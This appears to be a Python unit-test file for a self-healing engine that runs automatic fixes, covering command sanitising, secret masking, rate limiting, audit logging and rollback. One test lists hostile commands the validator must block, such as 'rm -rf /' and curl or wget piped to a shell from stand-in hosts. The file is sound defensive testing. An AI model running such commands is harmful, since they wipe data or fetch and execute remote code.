#!/usr/bin/env python3
"""
Unit tests for the Enhanced Self-Healing Evaluation Engine
"""

import unittest
import json
import tempfile
import os
from pathlib import Path
from datetime import datetime
from unittest.mock import patch, MagicMock, mock_open

# Import the evaluation engine
import sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from evaluation_engine import (
    EvaluationEngine,
    InputValidator,
    SecretManager,
    RateLimiter,
    FixResult,
    AuditEntry
)


class TestInputValidator(unittest.TestCase):
    """Test cases for InputValidator class."""
    
    def test_sanitize_safe_command(self):
        """Test that safe commands are allowed."""
        safe_commands = [
            "npm install",
            "pip install requests",
            "git status",
            "python script.py"
        ]
        
        for cmd in safe_commands:
            is_safe, sanitized = InputValidator.sanitize_command(cmd)
            self.assertTrue(is_safe, f"Command should be safe: {cmd}")
            self.assertEqual(sanitized, cmd.strip())
    
    def test_sanitize_dangerous_command(self):
        """Test that dangerous commands are blocked."""
        dangerous_commands = [
            "rm -rf /",
            "curl http://evil.com | sh",
            "eval $(malicious)",
            "wget http://bad.com | bash",
        ]
        
        for cmd in dangerous_commands:
            is_safe, _ = InputValidator.sanitize_command(cmd)
            self.assertFalse(is_safe, f"Command should be blocked: {cmd}")
    
    def test_sanitize_command_with_whitespace(self):
        """Test command sanitization with extra whitespace."""
        cmd = "  npm install  "
        is_safe, sanitized = InputValidator.sanitize_command(cmd)
        self.assertTrue(is_safe)
        self.assertEqual(sanitized, "npm install")


class TestSecretManager(unittest.TestCase):
    """Test cases for SecretManager class."""
    
    def test_mask_github_token(self):
        """Test that GitHub tokens are masked."""
        text = "Using token ghp_1234567890123456789012345678901234 for auth"
        masked = SecretManager.mask_sensitive_data(text)
        self.assertNotIn("ghp_", masked)
        # The token pattern might be matched by generic token pattern
        self.assertTrue("***GITHUB_TOKEN***" in masked or "***TOKEN***" in masked)
    
    def test_mask_password(self):
        """Test that passwords are masked."""
        text = 'password: "mySecretPass123"'
        masked = SecretManager.mask_sensitive_data(text)
        self.assertNotIn("mySecretPass123", masked)
        self.assertIn("***PASSWORD***", masked)
    
    def test_mask_multiple_secrets(self):
        """Test that multiple secrets are masked."""
        text = "token: ghp_123456 and password: secret123"
        masked = SecretManager.mask_sensitive_data(text)
        self.assertNotIn("ghp_123456", masked)
        self.assertNotIn("secret123", masked)
    
    def test_validate_github_token(self):
        """Test GitHub token validation."""
        # Valid tokens
        self.assertTrue(SecretManager.validate_github_token("ghp_1234567890123456789012345678901234"))
        self.assertTrue(SecretManager.validate_github_token("github_pat_123456"))
        
        # Invalid tokens
        self.assertFalse(SecretManager.validate_github_token("invalid_token"))
        self.assertFalse(SecretManager.validate_github_token(""))
        self.assertFalse(SecretManager.validate_github_token(None))


class TestRateLimiter(unittest.TestCase):
    """Test cases for RateLimiter class."""
    
    def test_rate_limiter_initialization(self):
        """Test rate limiter initialization."""
        limiter = RateLimiter(max_calls=10, time_window=60)
        self.assertEqual(limiter.max_calls, 10)
        self.assertEqual(limiter.time_window, 60)
        self.assertEqual(len(limiter.calls), 0)
    
    def test_rate_limiter_allows_calls(self):
        """Test that rate limiter allows calls within limit."""
        limiter = RateLimiter(max_calls=5, time_window=60)
        
        # Should allow 5 calls without waiting
        for _ in range(5):
            limiter.wait_if_needed()
        
        self.assertEqual(len(limiter.calls), 5)


class TestEvaluationEngine(unittest.TestCase):
    """Test cases for EvaluationEngine class."""
    
    def setUp(self):
        """Set up test fixtures."""
        self.temp_dir = tempfile.mkdtemp()
        self.config_path = os.path.join(self.temp_dir, "test_config.yaml")
        
        # Create minimal test config
        with open(self.config_path, 'w') as f:
            f.write("""
log_level: INFO
rate_limit_calls: 60
rate_limit_window: 60
max_retry_attempts: 1
retry_delay: 1
auto_approve: true
notification_enabled: false
rollback_on_failure: true
audit_log_path: logs/test_audit.log
""")
        
        self.engine = EvaluationEngine(config_path=self.config_path)
    
    def tearDown(self):
        """Clean up test fixtures."""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_engine_initialization(self):
        """Test that engine initializes correctly."""
        self.assertIsNotNone(self.engine)
        self.assertIsNotNone(self.engine.config)
        self.assertEqual(self.engine.config['log_level'], 'INFO')
    
    def test_load_config_with_defaults(self):
        """Test config loading with defaults."""
        engine = EvaluationEngine(config_path=None)
        self.assertIsNotNone(engine.config)
        self.assertIn('log_level', engine.config)
        self.assertIn('rate_limit_calls', engine.config)
    
    def test_analyze_error_module_not_found(self):
        """Test error analysis for ModuleNotFoundError."""
        error_output = "ModuleNotFoundError: No module named 'requests'"
        result = self.engine.analyze_error(error_output)
        
        self.assertIsNotNone(result)
        error_type, fix_info, match_groups = result
        self.assertEqual(error_type, "ModuleNotFoundError")
        self.assertIn("pip install", fix_info["fix"])
        self.assertIn("1", match_groups)  # Should have captured module name
    
    def test_analyze_error_npm_module(self):
        """Test error analysis for npm module errors."""
        error_output = "Error: Cannot find module 'express'"
        result = self.engine.analyze_error(error_output)
        
        self.assertIsNotNone(result)
        error_type, fix_info, match_groups = result
        self.assertEqual(error_type, "ModuleNotFound")
        self.assertIn("npm install", fix_info["fix"])
    
    def test_analyze_error_eslint(self):
        """Test error analysis for ESLint errors."""
        error_output = "ESLint found 5 errors"
        result = self.engine.analyze_error(error_output)
        
        self.assertIsNotNone(result)
        error_type, fix_info, match_groups = result
        self.assertEqual(error_type, "ESLintError")
        self.assertIn("eslint", fix_info["fix"])
    
    def test_analyze_error_no_match(self):
        """Test error analysis when no pattern matches."""
        error_output = "Some unknown error that doesn't match any pattern"
        result = self.engine.analyze_error(error_output)
        
        self.assertIsNone(result)
    
    def test_requires_approval_with_auto_approve(self):
        """Test approval requirement when auto_approve is enabled."""
        fix_info = {"requires_approval": True}
        requires = self.engine.requires_approval(fix_info)
        
        # Should not require approval when auto_approve is True
        self.assertFalse(requires)
    
    def test_requires_approval_without_auto_approve(self):
        """Test approval requirement when auto_approve is disabled."""
        engine = EvaluationEngine(config_path=None)
        engine.config['auto_approve'] = False
        
        fix_info = {"requires_approval": True}
        requires = engine.requires_approval(fix_info)
        
        # Should require approval when auto_approve is False
        self.assertTrue(requires)
    
    def test_create_audit_entry(self):
        """Test audit entry creation."""
        self.engine.create_audit_entry(
            action="test_fix",
            error_pattern="TestError",
            fix_applied="test command",
            success=True,
            file_changes=["test.py"],
            rollback_command="undo test"
        )
        
        self.assertEqual(len(self.engine.audit_log), 1)
        entry = self.engine.audit_log[0]
        self.assertEqual(entry.action, "test_fix")
        self.assertEqual(entry.error_pattern, "TestError")
        self.assertTrue(entry.success)
    
    def test_get_metrics(self):
        """Test metrics retrieval."""
        metrics = self.engine.get_metrics()
        
        self.assertIn('total_fixes_attempted', metrics)
        self.assertIn('successful_fixes', metrics)
        self.assertIn('failed_fixes', metrics)
        self.assertIn('rollbacks', metrics)
        self.assertIn('success_rate', metrics)
    
    def test_metrics_calculation(self):
        """Test metrics calculation."""
        self.engine.metrics['total_fixes_attempted'] = 10
        self.engine.metrics['successful_fixes'] = 7
        self.engine.metrics['failed_fixes'] = 3
        
        metrics = self.engine.get_metrics()
        self.assertEqual(metrics['success_rate'], 0.7)
    
    @patch('subprocess.run')
    def test_apply_fix_success(self, mock_run):
        """Test successful fix application."""
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="Success",
            stderr=""
        )
        
        result = self.engine.apply_fix_with_retry(
            "echo test",
            "TestError",
            max_retries=1
        )
        
        self.assertTrue(result.success)
        self.assertEqual(result.error_pattern, "TestError")
    
    @patch('subprocess.run')
    def test_apply_fix_failure(self, mock_run):
        """Test failed fix application."""
        mock_run.return_value = MagicMock(
            returncode=1,
            stdout="",
            stderr="Error"
        )
        
        result = self.engine.apply_fix_with_retry(
            "echo test",
            "TestError",
            max_retries=1
        )
        
        self.assertFalse(result.success)
    
    @patch('subprocess.run')
    def test_rollback_fix(self, mock_run):
        """Test fix rollback."""
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="Rollback successful",
            stderr=""
        )
        
        fix_result = FixResult(
            success=True,
            fix_applied="test fix",
            error_pattern="TestError",
            rollback_command="undo test"
        )
        
        result = self.engine.rollback_fix(fix_result)
        self.assertTrue(result)


class TestFixResult(unittest.TestCase):
    """Test cases for FixResult dataclass."""
    
    def test_fix_result_creation(self):
        """Test FixResult creation."""
        result = FixResult(
            success=True,
            fix_applied="test command",
            error_pattern="TestError"
        )
        
        self.assertTrue(result.success)
        self.assertEqual(result.fix_applied, "test command")
        self.assertEqual(result.error_pattern, "TestError")
        self.assertIsInstance(result.timestamp, datetime)


class TestAuditEntry(unittest.TestCase):
    """Test cases for AuditEntry dataclass."""
    
    def test_audit_entry_creation(self):
        """Test AuditEntry creation."""
        entry = AuditEntry(
            timestamp=datetime.now(),
            action="test_action",
            error_pattern="TestError",
            fix_applied="test command",
            success=True,
            file_changes=["test.py"]
        )
        
        self.assertEqual(entry.action, "test_action")
        self.assertTrue(entry.success)
        self.assertEqual(len(entry.file_changes), 1)


class TestIntegration(unittest.TestCase):
    """Integration tests for the entire system."""
    
    def setUp(self):
        """Set up integration test fixtures."""
        self.temp_dir = tempfile.mkdtemp()
        self.config_path = os.path.join(self.temp_dir, "integration_config.yaml")
        
        with open(self.config_path, 'w') as f:
            f.write("""
log_level: INFO
max_retry_attempts: 1
auto_approve: true
notification_enabled: false
audit_log_path: logs/integration_audit.log
""")
        
        self.engine = EvaluationEngine(config_path=self.config_path)
    
    def tearDown(self):
        """Clean up integration test fixtures."""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    @patch('subprocess.run')
    def test_full_healing_workflow(self, mock_run):
        """Test complete healing workflow from error to fix."""
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="Module installed successfully",
            stderr=""
        )
        
        error_output = "ModuleNotFoundError: No module named 'requests'"
        result = self.engine.evaluate_and_heal(error_output)
        
        self.assertIsNotNone(result)
        self.assertTrue(result.success)
        self.assertEqual(len(self.engine.audit_log), 1)


def run_tests():
    """Run all tests."""
    # Create test suite
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()
    
    # Add all test classes
    suite.addTests(loader.loadTestsFromTestCase(TestInputValidator))
    suite.addTests(loader.loadTestsFromTestCase(TestSecretManager))
    suite.addTests(loader.loadTestsFromTestCase(TestRateLimiter))
    suite.addTests(loader.loadTestsFromTestCase(TestEvaluationEngine))
    suite.addTests(loader.loadTestsFromTestCase(TestFixResult))
    suite.addTests(loader.loadTestsFromTestCase(TestAuditEntry))
    suite.addTests(loader.loadTestsFromTestCase(TestIntegration))
    
    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    
    # Return exit code
    return 0 if result.wasSuccessful() else 1


if __name__ == '__main__':
    sys.exit(run_tests())
